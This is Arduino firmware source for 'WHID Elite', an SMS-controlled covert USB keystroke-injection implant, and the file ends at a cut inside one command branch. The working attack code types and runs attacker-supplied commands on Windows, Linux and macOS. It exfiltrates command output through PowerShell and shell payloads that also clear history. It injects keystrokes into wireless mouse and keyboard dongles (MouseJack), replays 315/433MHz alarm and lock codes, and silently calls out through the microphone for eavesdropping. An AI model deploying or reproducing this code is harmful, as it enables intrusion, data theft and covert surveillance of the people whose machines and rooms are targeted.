// ###################################################################################################
// #                                      WHID Elite 1.3.1                                         ###
// #                              Copyright 2018-2019 - @LucaBongiorni                             ###
// ###################################################################################################
// #                  The MouseJacking portion of code has been re-adapted from                    ###
// #                      https://github.com/insecurityofthings/uC_mousejack                       ###
// ###################################################################################################
// ### NOTE:   If the Airgap doesn't type keystrokes properly, is because of atmega32u4 is         ###
// ###         running our of memory. Which means you  uploaded a too-big attack.h payload.        ###
// ###################################################################################################
// ##################################### Commands Available ##########################################
// ###################################################################################################
// ### batt:                         ### Example: ###   batt:                                        #
// ### enumos:                       ### Example: ###   enumos:                                      #
// ### airgapwin:<COMMAND-TO-EXFIL>  ### Example: ###   airgapwin:whoami                             #
// ### airgapnix:<COMMAND-TO-EXFIL>  ### Example: ###   airgapnix:whoami                             #
// ### airgaposx:<COMMAND-TO-EXFIL>  ### Example: ###   airgaposx:whoami                             #
// ### win:<COMMAND>                 ### Example: ###   win:iexplore -k http://fakeupdate.net/wnc/   #
// ### nix:<COMMAND>                 ### Example: ###   nix:gnome-calculator                         #
// ### osx:<COMMAND>                 ### Example: ###   osx:open -n -a calculator                    #
// ### spy:<PHONE-NUMBER>            ### Example: ###   spy:0039123123123                            #
// ### mousejack:                    ### Example: ###   mousejack:                                   #
// ### mousescan:                    ### Example: ###   mousescan:                                   #
// ### asktxD11:<BINARY-PATTERN>     ### Example: ###   asktxD11:101001011110101100000100  (Pin D11) #
// ### asktxD7:<BINARY-PATTERN>      ### Example: ###   asktxD7:101001011110101100000100   (Pin D7)  #
// ### jamD11:<TIME-IN-MILLISECONDS> ### Example: ###   jamD11:60000                       (Pin D11) #
// ### jamD7:<TIME-IN-MILLISECONDS>  ### Example: ###   jamD7:60000 (hardcoded 10s for now)(Pin D7)  #
// ### askrx:                        ### Example: ###   askrx: (Pin D3)                              # <<< NOTE <<< For now I am taking the 3.7V and the GND from the P2 pins! But I rather suggest to use the P3 with Vcc at 5V (It requires an external Powerbank/PC connected over UBS or P3).
// ### sniff&fuzz:                   ### Example: ###   sniff&fuzz: (Pin D3 & D7)                    #
// ### getlocation:                  ### Example: ###   getlocation:                                 #
// ###################################################################################################


// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// The asktx work with ONE TX connected per time for each Pin (i.e. D7, D11), I guess is matter of current absorbtion. The board cannot handle 2TX concurrently connected on the SAME Pin!
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// Reminder: Lines 575 and  582 have been commented out. If you see instability with SIM800, uncomment them again.
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

#include "Adafruit_FONA.h"
#include "FingerprintUSBHost.h"
#include <Keyboard.h>
//#include <Mouse.h>
//-------------------------- MOUSEJACK STUFF -------------------------------------------------
#include "SPI.h"
#include "nRF24L01.h"
#include "RF24.h"
#include "attack.h"
#define CE 5
#define CSN 6
#define PKT_SIZE 37
#define PAY_SIZE 32
#define MICROSOFT 1
#define LOGITECH 2
//-------------------------- MOUSEJACK STUFF --------------------------------------------------

//-------------------------- 315/433MHz STUFF -------------------------------------------------
#include <RCSwitch.h>
//Uncomment two lines below, in case u need create ad-hoc pulses with digitalWrite(11, HIGH); in the command asktx:.
//#define transmitPin 11 //Or 7 in case you use the D7 Pin.
//int timeDelay = 135;

RCSwitch RF = RCSwitch();

int dontSMS=0; // Set to 1 to save SMS
 
// Dec to Bin https://forum.arduino.cc/index.php?topic=412553.0
char *tobin32(unsigned long x)
{
  static char b[33]; //this size should be enough for any ASK/OOK protocol out there. If not, change it accordingly.
  b[32] = '\0';

  for ( int z = 0; z < 32; z++) {
    b[31 - z] = ((x >> z) & 0x1) ? '1' : '0';
  }

  return b;
}
//-------------------------- 315/433MHz STUFF -------------------------------------------------

#define FONA_RX 2
#define FONA_TX 3
#define FONA_RST 4


HardwareSerial *fonaSerial = &Serial1;
Adafruit_FONA fona = Adafruit_FONA(FONA_RST);

uint8_t readline(char *buff, uint8_t maxbuff, uint16_t timeout = 0);

//This function return the amount of free memory available. Is used only for debugging.
int freeRam () {
  extern int __heap_start, *__brkval;
  int v;
  return (int) &v - (__brkval == 0 ? (int) &__heap_start : (int) __brkval);
}

//-------------------------- MOUSEJACK STUFF -------------------------------------------------
RF24 radio(CE, CSN);

long time;
long hops;
int ledpin = 13;
uint64_t promisc_addr = 0xAALL;
uint8_t channel = 25;
uint64_t address;
uint8_t payload[PAY_SIZE];
uint8_t payload_size;
bool payload_encrypted = false;
uint8_t payload_type = 0;
uint16_t sequence;

void print_payload_details() {
  Serial.print(F("ch: "));
  Serial.print(channel);
  Serial.print(F(" s: "));
  Serial.print(payload_size);
  Serial.print(F(" a: "));
  for (int j = 0; j < 5; j++)
  {
    Serial.print((uint8_t)(address >> (8 * j) & 0xff), HEX);
    Serial.print(F(" "));
  }
  Serial.print(" p: ");
  for (int j = 0; j < payload_size; j++)
  {
    Serial.print(payload[j], HEX);
    Serial.print(F(" "));
  }
  Serial.println(F(""));
  return;
}

// Update a CRC16-CCITT with 1-8 bits from a given byte
uint16_t crc_update(uint16_t crc, uint8_t byte, uint8_t bits) {
  crc = crc ^ (byte << 8);
  while (bits--)
    if ((crc & 0x8000) == 0x8000) crc = (crc << 1) ^ 0x1021;
    else crc = crc << 1;
  crc = crc & 0xFFFF;
  return crc;
}

uint8_t writeRegister(uint8_t reg, uint8_t value) {
  uint8_t status;

  digitalWrite(CSN, LOW);
  status = SPI.transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  SPI.transfer(value);
  digitalWrite(CSN, HIGH);
  return status;
}

uint8_t writeRegister(uint8_t reg, const uint8_t* buf, uint8_t len) {
  uint8_t status;

  digitalWrite(CSN, LOW);
  status = SPI.transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  while (len--)
    SPI.transfer(*buf++);
  digitalWrite(CSN, HIGH);

  return status;
}

bool transmit() {
  print_payload_details();
  radio.write(payload, payload_size);
  return true;
}

void scan() {
  Serial.println(F("Scanning..."));
  //Serial.print(F("Free RAM: "));
  //Serial.println(freeRam());

  int x, offset;
  uint8_t buf[PKT_SIZE];
  uint16_t wait = 100;
  uint8_t payload_length;
  uint16_t crc, crc_given;

  // The order of the following is VERY IMPORTANT
  radio.setAutoAck(false);
  // radio.setPALevel(RF24_PA_MIN);
  // radio.setDataRate(RF24_2MBPS);
  //writeRegister(RF_SETUP, 0x09); // Disable PA, 2M rate, LNA enabled // Default 0x09 (in binary 1001).
  // More info https://nrqm.ca/nrf24l01/firmware/rf_setup-register/ Where 1-2 bits can be 00 for -18dBm (MIN)[0x09] or 11 0dBm (MAX)[0x0f]
  writeRegister(RF_SETUP, 0x0f);   // 0x0f (in binary 1111): RF Max, 2M Rate, LNA enabled
  radio.setPayloadSize(32);
  radio.setChannel(channel);
  // RF24 doesn't ever fully set this -- only certain bits of it
  writeRegister(EN_RXADDR, 0x00);
  // RF24 doesn't have a native way to change MAC...
  // 0x00 is "invalid" according to the datasheet, but Travis Goodspeed found it works :)
  writeRegister(SETUP_AW, 0x00);
  radio.openReadingPipe(0, promisc_addr);
  radio.disableCRC();
  radio.startListening();
  //radio.printDetails();



  hops = 0;
  while (hops < 5000) { //The more you increase this value, the longer the NRF chipset will scan for vulnerable Mice & Keyboards! (Default: 2000)
    hops++;
    //Serial.print(F("Channel Hops: "));
    //Serial.println(F(hops));
    channel++;
    if (channel > 84) {
      //Serial.println(F("Channel Hopping..."));
      Serial.print(F("Free RAM: "));
      Serial.println(freeRam());
      channel = 2;
    }

    radio.setChannel(channel);

    time = millis();
    while (millis() - time < wait)
    {
      if (radio.available())
      {
        radio.read(&buf, sizeof(buf));

        // In promiscuous mode without a defined address prefix, we attempt to
        // decode the payload as-is, and then shift it by one bit and try again
        // if the first attempt did not pass the CRC check. The purpose of this
        // is to minimize missed detections that happen if we were to use both
        // 0xAA and 0x55 as the nonzero promiscuous mode address bytes.

        for (offset = 0; offset < 2; offset++) {
          // Shift the payload right by one bit if this is the second pass
          if (offset == 1) {
            for (x = 31; x >= 0; x--) {
              if (x > 0) buf[x] = buf[x - 1] << 7 | buf[x] >> 1;
              else buf[x] = buf[x] >> 1;
            }
          }

          // Read the payload length
          payload_length = buf[5] >> 2;

          // Check for a valid payload length, which is less than the usual 32 bytes
          // because we need to account for the packet header, CRC, and part or all
          // of the address bytes.
          if (payload_length <= (PAY_SIZE - 9))
          {
            // Read the given CRC
            crc_given = (buf[6 + payload_length] << 9) | ((buf[7 + payload_length]) << 1);
            crc_given = (crc_given << 8) | (crc_given >> 8);
            if (buf[8 + payload_length] & 0x80) crc_given |= 0x100;

            // Calculate the CRC
            crc = 0xFFFF;
            for (x = 0; x < 6 + payload_length; x++) crc = crc_update(crc, buf[x], 8);
            crc = crc_update(crc, buf[6 + payload_length] & 0x80, 1);
            crc = (crc << 8) | (crc >> 8);

            // Verify the CRC
            if (crc == crc_given) {
              Serial.print(F("Found packet /w valid crc... "));

              if (payload_length > 0) {
                // Write the address
                address = 0;
                for (int i = 0; i < 4; i++)
                {
                  address += buf[i];
                  address <<= 8;
                }
                address += buf[4];

                // Write the ESB payload to the output buffer
                for (x = 0; x < payload_length + 3; x++)
                  payload[x] = ((buf[6 + x] << 1) & 0xFF) | (buf[7 + x] >> 7);
                payload_size = payload_length;

                print_payload_details();
                return;
              } else {
                Serial.println(F("Payload is empty. Keep scanning."));
              }
            }
          }
        }
      }
    }
  }
}

void start_transmit() {
  radio.stopListening();
  radio.openWritingPipe(address);
  radio.openReadingPipe(1, address);
  radio.setAutoAck(true);
  radio.setPALevel(RF24_PA_MAX);
  radio.setDataRate(RF24_2MBPS);
  radio.setPayloadSize(32);
  radio.enableDynamicPayloads();
  writeRegister(SETUP_AW, 0x03); // Reset addr size to 5 bytes
  radio.setRetries(5, 15); // retransmission: interval and count
  radio.setChannel(channel);

  return;
}

void ms_crypt() {  // Decrypt those keyboard packets!
  for (int i = 4; i < payload_size; i++)
    payload[i] ^= address >> (((i - 4) % 5) * 8) & 0xFF;
}

void ms_checksum() { // Calculate microsoft wireless keyboard checksum
  int last = payload_size - 1;
  payload[last] = 0;
  for (int i = 0; i < last; i++)
    payload[last] ^= payload[i];
  payload[last] = ~payload[last];
}

void fingerprint() {
  if (payload_size == 19 && payload[0] == 0x08 && payload[6] == 0x40) {
    Serial.println(F("MS"));
    payload_type = MICROSOFT;
    return;
    //It was declared globally as uint8_t payload_type = 0;
  }

  if (payload_size == 19 && payload[0] == 0x0a) {
    Serial.println(F("MS-Enc"));
    payload_type = MICROSOFT;
    payload_encrypted = true;
    return;
  }

  if (payload[0] == 0) {
    if (payload_size == 10 && (payload[1] == 0xC2 || payload[1] == 0x4F))
      payload_type = LOGITECH;
    if (payload_size == 22 && payload[1] == 0xD3)
      payload_type = LOGITECH;
    if (payload_size == 5 && payload[1] == 0x40)
      payload_type = LOGITECH;
    if (payload_type == LOGITECH) {
      Serial.println(F("Logitech"));
    }
  }
  return;
}

void ms_transmit(uint8_t meta, uint8_t hid) {
  if (payload_encrypted) ms_crypt();
  for (int n = 4; n < payload_size; n++)
    payload[n] = 0;
  payload[4] = sequence & 0xff;
  payload[5] = sequence >> 8 & 0xff;
  payload[6] = 67;
  payload[7] = meta;
  payload[9] = hid;
  ms_checksum();
  if (payload_encrypted) ms_crypt();
  //Send keystroke (key down)
  transmit();
  delay(5);
  sequence++;
  if (payload_encrypted) ms_crypt();
  for (int n = 4; n < payload_size; n++)
    payload[n] = 0;
  payload[4] = sequence & 0xff;
  payload[5] = sequence >> 8 & 0xff;
  payload[6] = 67;
  ms_checksum();
  if (payload_encrypted) ms_crypt();
  //Send null keystroke (key up)
  transmit();
  delay(5);
  sequence++;
  return;
}

void log_checksum() {
  uint8_t cksum = 0xff;
  int last = payload_size - 1;
  for (int n = 0; n < last; n++)
    cksum -= payload[n];
  cksum++;
  payload[last] = cksum;
}

void log_transmit(uint8_t meta, uint8_t keys2send[], uint8_t keysLen) {
  // setup empty payload
  payload_size = 10;
  for (int n; n < payload_size; n++)
    payload[n] = 0;

  // prepare key down frame
  payload[1] = 0xC1;
  payload[2] = meta;

  for (int q = 0; q < keysLen; q++)
    payload[3 + q] = keys2send[q];
  log_checksum();

  // send key down
  transmit();
  delay(5);

  // prepare key up (null) frame
  payload[2] = 0;
  payload[3] = 0;
  payload[4] = 0;
  payload[5] = 0;
  payload[6] = 0;
  payload[7] = 0;
  payload[8] = 0;
  log_checksum();

  // send key up
  transmit();
  delay(5);
  return;
}

void launch_attack() {
  //Serial.println(F("Starting attack..."));

  if (payload_type) {
    //Serial.println(F("Payload type is injectable"));
    start_transmit();

    uint8_t meta = 0;
    uint8_t hid = 0;
    uint8_t wait = 0;
    int offset = 0;

    uint8_t keys2send[6];
    uint8_t keysLen = 0;

    int keycount = sizeof(attack) / 3;
    sequence = 0;

    // This is to sync the new serial
    if (payload_type == MICROSOFT) {
      for (int i = 0; i < 6; i++) {
        ms_transmit(0, 0);
      }
    }

    // Now inject the hid codes
    for (int i = 0; i <= keycount; i++)
    {
      offset = i * 3;
      meta = attack[offset];
      hid = attack[offset + 1];
      wait = attack[offset + 2];

      if (payload_type == LOGITECH) {
        if (meta) {
          if (keysLen > 0) {
            log_transmit(0, keys2send, keysLen);
            keysLen = 0;
          }
          keys2send[0] = hid;
          log_transmit(meta, keys2send, 1);
          keysLen = 0;
        } else if (hid) {
          //Serial.print(F("hid code: "));
          //Serial.println(hid);
          bool dup = false;
          for (int j = 0; j < keysLen; j++) {
            if (keys2send[j] == hid)
              dup = true;
          }
          if (dup) {
            log_transmit(meta, keys2send, keysLen);
            keys2send[0] = hid;
            keysLen = 1;
          } else if (keysLen == 5) {
            keys2send[5] = hid;
            keysLen = 6;
            log_transmit(meta, keys2send, keysLen);
            keysLen = 0;
          } else {
            keys2send[keysLen] = hid;
            keysLen++;
          }
        } else if (wait) {
          if (keysLen > 0) {
            log_transmit(meta, keys2send, keysLen);
            keysLen = 0;
          }
          // Serial.println(F("Waiting"));
          delay(wait << 4);
        }
        if (i == keycount && keysLen > 0) {
          log_transmit(meta, keys2send, keysLen);
        }
      }

      if (payload_type == MICROSOFT) {
        if (hid) {
          //Serial.print(F("Sending HID code: "));
          //Serial.println(F(hid));
          ms_transmit(meta, hid);
        }
        if (wait) {
          //Serial.println("waiting");
          delay(wait << 4);
        }
      }
    }
  }
  return;
}

void reset() {
  payload_type = 0;
  payload_encrypted = false;
  payload_size = 0;
  for (int i = 0; i < PAY_SIZE; i++) {
    payload[i] = 0;
  }
  radio.begin();
}
//-------------------------- MOUSEJACK STUFF -------------------------------------------------


char fonaNotificationBuffer[64];
char smsBuffer[150]; //Default 250. If changed, need also to change Line 615 accordingly.

void typeKey(uint8_t key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}


void setup() {
  Keyboard.begin();

  // ------ Initialize SIM800 ------
  pinMode(13, OUTPUT);
  digitalWrite(13, LOW); //(SIM800 gets resetted ONLY when RST is pulled LOW)
  delay(50);
  digitalWrite(13, HIGH);
  pinMode(2, OUTPUT);
  digitalWrite(2, HIGH); //HIGH == connected to GND
  delay(1000);
  digitalWrite(2, LOW); 
  // ------ Initialize SIM800 ------


  // #########################################################################################
  // ##### This must be commented. Otherwise the script will never start automatically. ######
  // ##### Uncomment, only if you wanna use serial monitor to debug the whole workflow  ######
  // ##### and you wanna start SIM800 manually.                                         ######
  // #########################################################################################
  //while (!Serial);
  // #########################################################################################

  Serial.begin(4800);
  fonaSerial->begin(4800);
  if (! fona.begin(*fonaSerial)) {
    Serial.println(F("NO SIM800!"));
    while (1);
  }
  fona.unlockSIM("1234"); // ### Change this to your SIM's Pincode (if any) ###
  //fonaSerial->print("AT+CLCK=\"SC\",0,\"1234\"\r\n"); // ### This remove permanently your SIM's Pincode ###
  
  //delay(3000); //###LBO: Original Working Delay
  delay(1000);
  fonaSerial->print("AT+CNMI=2,1\r\n");  //Set up the SIM800 to send a +CMTI notification when an SMS is received
  delay(500);
  fona.setGPRSNetworkSettings(F("internet")); //### APN Setting in case you MNO requires specific ones ###

  while(true){
    int i = fona.getNumSMS();
    Serial.print(F("Number of SMS: "));
    Serial.println(i);
    if(i != -1){
      Serial.println(F("\n\rDeleting SMS...")); 
      delay(500);
      if(fona.sendCheckReply(F("AT+CMGDA=\"DEL ALL\"\r\n"), F("OK"), 100)){
        break;
      }
    }
    if(i==0) break;
    delay(500);
  }
  // fonaSerial->print("AT+CLIR=1\r\n"); //### Uncomment this to hide WHIDelite number while calling ###
  Serial.println(F("WHID Elite 1.3.1 is OK")); 
}


void loop() {
  //delay(3000); //###LBO: Original Working Delay
  delay(1000);
  char* bufPtr = fonaNotificationBuffer;

  if (fona.available()) {
  //Serial.println(F("WHID Elite 1.3.1 is OK")); 
    int slot = 0;
    int charCount = 0;
    //Read the notification into fonaInBuffer
    do  {
      *bufPtr = fona.read();
      Serial.write(*bufPtr);
      delay(1);
    } while ((*bufPtr++ != '\n') && (fona.available()) && (++charCount < (sizeof(fonaNotificationBuffer) - 1)));

    //Add a terminal NULL to the notification string
    *bufPtr = 0;

    //Scan the notification string for an SMS received notification.
    // If it's an SMS message, we'll get the slot number in 'slot'
    if (1 == sscanf(fonaNotificationBuffer, "+CMTI: " FONA_PREF_SMS_STORAGE ",%d", &slot)) {
      Serial.print(F("slot: ")); Serial.println(slot);

      char callerIDbuffer[32];  //We'll store the SMS sender number in here

      // Retrieve SMS sender address/phone number.
      if (! fona.getSMSSender(slot, callerIDbuffer, 31)) {
        Serial.println(F("Didn't find SMS message in slot!"));
      }
      //Serial.print(F("FROM: ")); Serial.println(callerIDbuffer);

      // Retrieve SMS value.
      uint16_t smslen;


      if (fona.readSMS(slot, smsBuffer, 150, &smslen)) { //Default 250. If changed, need also to change Line 538 accordingly.
        //############################################################################################
        //######################### HERE ARE STARTING THE COMMANDS AVAILABLE #########################
        //############################################################################################

        //####### airgapwin: ################################################################################################################################
        //# It opens a powershell, types the exfil-payload (with the payload contained into the SMS that you want to exfiltrate. e.g. whoami), then runs it.
        //###################################################################################################################################################
        if (strncmp(smsBuffer, "airgapwin:", 10) == 0) {
          //Serial.print(F("Free RAM: "));
          //Serial.println(freeRam());
          delay(500);
          Keyboard.press(KEY_LEFT_GUI);
          delay(50);
          Keyboard.press((char) 114); //In Decimal, is r
          Keyboard.releaseAll();
          delay(1000);
          Keyboard.print("powershell"); // we need to type cmd and then insert payload there, because of a RUN textbox limitation buffer of 260 chars.
          delay(1000);
          typeKey(KEY_RETURN);
          delay(1000);
          Keyboard.print(F("$c=(gwmi Win32_SerialPort|Where-Object{$_.PNPDeviceID -match \"ID_1B4F&PID_9208\"}).DeviceID;$r="));
          delay(300);
          Keyboard.print(smsBuffer + 10);
          delay(300);
          // Clear-History or ALT+F7
          Keyboard.print(F(";$p=new-Object System.IO.Ports.SerialPort $c,4800,None,8,one;$p.open();$p.WriteLine(\"BAG:$r\");$p.Close();Clear-History -CommandLine \"*$*\";exit;"));
          delay(1000);
          typeKey(KEY_RETURN);
          delay(1000);
        }
        //####### airgapnix: ###########################################################################################################################
        //# It opens a shell, types the exfil-payload (with the payload contained into the SMS that you want to exfiltrate. e.g. whoami), then runs it.
        //##############################################################################################################################################
        else if (strncmp(smsBuffer, "airgapnix:", 10) == 0) {
          delay(500);
          Keyboard.press(KEY_LEFT_GUI);
          delay(50);
          Keyboard.releaseAll();
          delay(1000);
          Keyboard.print("term");
          delay(1500);
          typeKey(KEY_RETURN);
          delay(1200);
          /*  // <-- change to //* 
          Keyboard.print(F("sleep .5;stty -F /dev/serial/by-id/\*LilyPad\* 4800;echo -e \"BAG:\"$("));
          delay(300);
          Keyboard.print(smsBuffer + 10);
          delay(300);
          Keyboard.print(F(")\"\" > /dev/serial/by-id/\*LilyPad\*;exit"));
          /*/
          Keyboard.print(F(" sleep .5;l=$(ls /dev/serial/by-id/*LilyPad*);stty -F $l 4800;echo BAG:$(echo $("));
          delay(300);
          Keyboard.print(smsBuffer + 10);
          delay(300);
          Keyboard.print(F(")) > $l;exit"));
          //*/
          delay(1500);
          typeKey(KEY_RETURN);
          delay(1500);
        }
        //####### airgaposx: ###########################################################################################################################
        //# It opens a shell, types the exfil-payload (with the payload contained into the SMS that you want to exfiltrate. e.g. whoami), then runs it
        //##############################################################################################################################################
        //TODO: Despite it works, there is a bug. It doesn't like symbols. Need to sanitize them with with quotes or backslash. (e.g. airgapnix:uname -a >>>> FAIL / aigapnix:uname >>>> PASS)
        else if (strncmp(smsBuffer, "airgaposx:", 10) == 0) {
          delay(500);
          Keyboard.press(KEY_LEFT_GUI);
          delay(50);
          Keyboard.press((char) 32); //In Decimal, is SPACE
          Keyboard.releaseAll();
          delay(1000);
          Keyboard.print("terminal.app");
          delay(1000);
          typeKey(KEY_RETURN);
          delay(1000);
          Keyboard.print(F("sleep .5;stty -f /dev/cu.usbmodemHID* 4800;echo -e \"BAG:\"$(")); //not sure if in all OSX machines, WHID Elite's serial port is identified a scu.usbmodemHIDF1, it may need more checks
          delay(300);
          Keyboard.print(smsBuffer + 10);
          delay(300);
          Keyboard.print(F(") > /dev/cu.usbmodemHID*;")); //Not sure if in all OSX machines, WHID Elite's serial port is identified as cu.usbmodemHIDF1 or cu.usbmodemHIDFG1 or cu.usbmodemHIDPC1 , it may need more checks.
          //If you do plug WHID Elite into an OSX-based machine… can you send me the output of this command: ls /dev/cu*
          delay(1000);
          typeKey(KEY_RETURN);
          delay(1000);
          Keyboard.press(KEY_LEFT_GUI); //CMD
          delay(50);
          Keyboard.press((char) 113); //q
          Keyboard.releaseAll(); //CMD + q >> quits focused window
        }
        //####### win: #############################################################################
        //# It runs GUI+r, opens a CMD shell and executes the payload contained into the SMS
        //##########################################################################################
        else if (strncmp(smsBuffer, "win:", 4) == 0) {
          // It runs GUI+r, opens a CMD shell and executes the payload contained into the SMS
          delay(500);
          Keyboard.press(KEY_LEFT_GUI);
          delay(50);
          Keyboard.press((char) 114); //In Decimal, is r
          //Keyboard.write((char) 0x72); //In Hex
          Keyboard.releaseAll();
          delay(1000);
          Keyboard.print((smsBuffer + 4));
          delay(1000);
          typeKey(KEY_RETURN);
          delay(1000);
        }
        //####### nix: #############################################################################
        //# It runs ALT + F2, opens a shell and executes the payload contained into the SMS
        //##########################################################################################
        else if (strncmp(smsBuffer, "nix:", 4) == 0) {
          // It runs ALT + F2, opens a shell and executes the payload contained into the SMS
          delay(500);
          Keyboard.press(KEY_LEFT_GUI);
          delay(50);
          Keyboard.releaseAll();
          delay(1000);
          // No need for terminal ALT-F2 straight runs commands
          // And it is multi-desktop solution
          Keyboard.print("term");
          delay(1500);
          typeKey(KEY_RETURN);
          delay(1500);
          Keyboard.print(" ");
          Keyboard.print(smsBuffer + 4);
          Keyboard.print(";exit");
          delay(1500);
          typeKey(KEY_RETURN);
          delay(1000);
        }
        //####### osx: #############################################################################
        //# It opens a shell and executes the payload contained into the SMS
        //##########################################################################################
        else if (strncmp(smsBuffer, "osx:", 4) == 0) {
          // It opens a shell and executes the payload contained into the SMS
          delay(500);
          Keyboard.press(KEY_LEFT_GUI);
          delay(50);
          Keyboard.press((char) 32); //In Decimal, is SPACE
          Keyboard.releaseAll();
          delay(1000);
          Keyboard.print("terminal.app");
          delay(1000);
          typeKey(KEY_RETURN);
          delay(1000);
          Keyboard.print(smsBuffer + 4);
          delay(1000);
          typeKey(KEY_RETURN);
          //Uncomment if needed. It all depends from which type of remote commands you are planning to send. ;)
          //            delay(1000);
          //            Keyboard.press(KEY_LEFT_GUI); //CMD
          //            delay(50);
          //            Keyboard.press((char) 113); //q
          //            Keyboard.releaseAll(); //CMD + q >> quits focused window
        }
        //####### spy: ############################################
        //# It enables the internal Microphone and calls you back.
        //#########################################################
        else if (strncmp(smsBuffer, "spy:", 4) == 0) {
          //In case you have troubles to hear the audio from WHID Elite, try uncommenting these lines.
          //            if (! fona.setAudio(FONA_EXTAUDIO)) {
          //                  Serial.println(F("Error while enabling Mic!"));
          //            }
          //            else {
          //                  Serial.println(F("Mic Enabled!"));
          //            }
          //            fona.setMicVolume(FONA_EXTAUDIO, 10);
          delay(1000);
          if (!fona.callPhone((smsBuffer + 4))) {
            Serial.println(F("Call Failed"));
          } else {
            Serial.println(F("### STARTING ACOUSTIC SURVEILLANCE ###"));
            delay(1000);
          }
        }
        //####### mousejack: ############
        //# Starts Mousejack attack
        //###############################
        else if (strncmp(smsBuffer, "mousejack:", 10) == 0) {
          // The mousejack attack is done 2 times, due to the hit-or-miss nature, some keystrokes may be missed during the one attack.
          // TODO: Add multi-payload selection. i.e. mousejack:attack2. (check WHID_Elite_attack.h_1.2.3.1.ino)
          // I know, dirty as fuck, but works and is late night.
          reset();
          scan();
          fingerprint();
          launch_attack();
          reset();
          scan();
          fingerprint();
          launch_attack();
          //reset();
          //scan();
          //fingerprint();
          //launch_attack();
        }
        //####### mousescan: ####################################
        //# Scan for Mousejackable devices. If found, send SMS.
        //#######################################################
        else if (strncmp(smsBuffer, "mousescan:", 10) == 0) {
          reset();
          scan();
          fingerprint();
          if (payload_type == MICROSOFT) {
            fona.sendSMS(callerIDbuffer, "MICROSOFT");
          }
          else if (payload_type == LOGITECH) {
            fona.sendSMS(callerIDbuffer, "LOGITECH");
          }
        }
        //-------------------------- 315/433MHz STUFF -------------------------------------------------
        //####### asktxD11: #############################################################################
        //# Transmit on Pin D11 325/433MHz an arbitrary binary sequence with OOK/ASK Encoding/Modulation
        //###############################################################################################
        // ############################################################################################################################
        // #### For some reasons there is a bug... rcswitch adds one zero more... so remove the last one from the signal binary!!! ####
        // ############################################################################################################################
        // ### Example: ###
        // 1010010111101011000001000 // original signal
        // 101001011110101100000100 //to use (see! one zero less at the end)
        // Hard-coded binary sequence for testing purposes.
        // RF.send("101001011110101100000100");  // GSM Alarm at 433MHz
        // RF.send("010101010101010100001100");  // RFID RFLock at 315MHz
        else if (strncmp(smsBuffer, "asktxD11:", 9) == 0) {
          delay(1000);
          // Transmitter is connected to Atmega 32u4 Pin D11
          // Wiring of external 433/315MHz TX:
          // GND  >> GND
          // DATA >> D11
          // VCC  >> VCC
          RF.enableTransmit(11); //Pin D11
          // Optional set protocol (default is 1, will work for most outlets)
          // RF.setProtocol(2);
          // Optional set pulse length. (this must be set after protocol (if set). Otherwise is overridden).
          // RF.setPulseLength(456);
          // Optional set number of transmission repetitions.
          RF.setRepeatTransmit(50);  //##################### Number of Times the binary sequence will be transmitted. Default: 1 #################
          // Use this to add manually specific HIGH or LOW pulses with specific length.
          //      int highLength = 4;
          //      int lowLength = 18;
          //      digitalWrite(11, HIGH);
          //      delayMicroseconds(highLength*timeDelay);
          //      digitalWrite(11,LOW);
          //      delayMicroseconds(lowLength*timeDelay);
          //RF.send("101001011110101100000100"); //Hardcoded binary sequence for testing purposes.
          //RF.send(5393, 24); //Example of sending decimal value. Where 24 is the code lenght.
          RF.send((smsBuffer + 9));
          RF.disableTransmit();
          delay(1000);
        }
        //####### asktxD7: #############################################################################
        //# Transmit on Pin D7 325/433MHz an arbitrary binary sequence with OOK/ASK Encoding/Modulation
        //##############################################################################################
        // ############################################################################################################################
        // #### For some reasons there is a bug... rcswitch adds one zero more... so remove the last one from the signal binary!!! ####
        // ############################################################################################################################
        // ### Example: ###
        // 1010010111101011000001000 // original signal
        // 101001011110101100000100 //to use (see! one zero less at the end)
        // Hard-coded binary sequence for testing purposes.
        // RF.send("101001011110101100000100");  // GSM Alarm at 433MHz
        // RF.send("010101010101010100001100");  // RFID RFLock at 315MHz
        else if (strncmp(smsBuffer, "asktxD7:", 8) == 0) {
          delay(1000);
          // Transmitter is connected to Atmega 32u4 Pin D7
          // Wiring of external 433/315MHz TX:
          // GND  >> GND
          // DATA >> D7
          // VCC  >> VCC
          RF.enableTransmit(7); //Pin D7
          // Optional set protocol (default is 1, will work for most outlets)
          // RF.setProtocol(2);
          // Optional set pulse length. (this must be set after protocol (if set). Otherwise is overridden).
          // RF.setPulseLength(456);
          // Optional set number of transmission repetitions.
          RF.setRepeatTransmit(50);  //##################### Number of Times the binary sequence will be transmitted. Default: 1 #################
          // Use this to add manually specific HIGH or LOW pulses with specific length.
          //      int highLength = 4;
          //      int lowLength = 18;
          //      digitalWrite(7, HIGH);
          //      delayMicroseconds(highLength*timeDelay);
          //      digitalWrite(7,LOW);
          //      delayMicroseconds(lowLength*timeDelay);
          //RF.send("101001011110101100000100"); //Hardcoded binary sequence for testing purposes.
          //RF.send(5393, 24); //Example of sending decimal value. Where 24 is the code lenght.  
          RF.send((smsBuffer + 9));
          RF.disableTransmit();
          delay(1000);
        }
        //####### sniff&fuzz: #####################################################################################################################
        //# Listen on Pin D3 & Re-Transmit on Pin D11 325/433MHz an arbitrary binary sequence W/ basic counter with OOK/ASK Encoding/Modulation
        //#########################################################################################################################################
        else if (strncmp(smsBuffer, "sniff&fuzz:", 11) == 0) {
